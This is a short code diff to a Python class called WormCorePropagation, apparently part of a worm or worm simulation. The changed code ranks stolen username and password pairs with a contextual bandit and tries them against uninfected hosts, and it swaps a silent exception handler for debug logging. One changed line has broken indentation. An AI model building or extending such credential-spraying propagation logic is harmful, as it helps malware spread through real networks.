@@ -75,14 +75,14 @@ class WormCorePropagation:
                     "is_database": host.get("host_type") == "database",
                     "target_count": len(self.infected_hosts),
                 }
-                bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
+                    bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
                 if bandit_cred:
                     username, password, ucb = bandit_cred
                     discovered = [(username, password)] + [
                         c for c in discovered if c != (username, password)
                     ]
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"Bandit credential selection failed: {e}")
 
         for username, password in discovered[:5]:
             for host in uninfected:
